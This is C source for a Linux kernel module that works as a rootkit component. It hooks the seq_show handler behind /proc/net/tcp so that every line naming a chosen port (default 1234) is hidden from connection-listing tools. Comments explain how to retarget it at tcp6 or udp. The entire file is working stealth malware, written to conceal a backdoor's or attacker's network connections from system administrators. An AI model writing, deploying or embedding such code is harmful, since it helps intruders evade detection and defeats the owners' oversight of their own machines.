#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/seq_file.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <net/tcp.h>
#include <net/udp.h>

MODULE_LICENSE("GPL");

const char proc_file[]= "/proc/net/tcp"; //you can change tcp to tcp6 or udp or udp6
#define AFINFO struct tcp_seq_afinfo  //use this for tcp/tcp6
//#define AFINFO struct udp_seq_afinfo  //use this for udp/udp6

int port=1234;

module_param(port, int, 0644);

int (*real_seq_show)(struct seq_file *seq, void *v)=0;
int (**p_seq_show)(struct seq_file *seq, void *v)=0;

int hacked_seq_show(struct seq_file *seq, void *v){
	int ret;
	char buf[10];
	int count_before,count_after;
	snprintf(buf, sizeof(buf), ":%04X", port);
	count_before=seq->count;
	ret = real_seq_show(seq, v);
	count_after=seq->count;
	//printk("count=%d\n",(int)seq->count);
	if(strnstr(seq->buf + count_before, buf, count_after-count_before)){
		seq->count = count_before;
	}
	return ret;
}

static int lkm_init(void){
	struct file *filp;
	AFINFO *afinfo;

	filp = filp_open(proc_file,O_RDONLY, 0);
	if(IS_ERR(filp)){
		printk("vfs hook failed\n");
	}
	else{
		printk("vfs hook succ\n");
		//afinfo = PDE_DATA(filp->f_path.dentry->d_inode);
		afinfo = PDE_DATA(filp->f_inode);
		real_seq_show = afinfo->seq_ops.show;
		p_seq_show=&afinfo->seq_ops.show;
		afinfo->seq_ops.show = hacked_seq_show;
		filp_close(filp, 0);
	}
    return 0;
}

static void lkm_exit(void){
	if(real_seq_show&&p_seq_show){
		*p_seq_show=real_seq_show;
		printk("hook removed\n");
	}
	else{
		printk("nothing to do\n");
	}
	return;
}

module_init(lkm_init);
module_exit(lkm_exit);
